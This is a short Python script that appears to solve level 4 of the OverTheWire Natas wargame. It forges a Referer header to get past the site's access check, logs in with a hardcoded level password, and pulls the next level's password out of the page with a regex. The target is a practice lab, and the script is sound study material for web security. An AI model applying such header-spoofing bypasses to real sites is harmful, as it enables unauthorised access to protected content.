import requests
import re

username ='natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

head = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org/' %username
responce=requests.get(url, auth = (username, password),headers = head)
content = responce.text
print (content)

print (re.findall('The password for natas5 is (.*)',content)[0])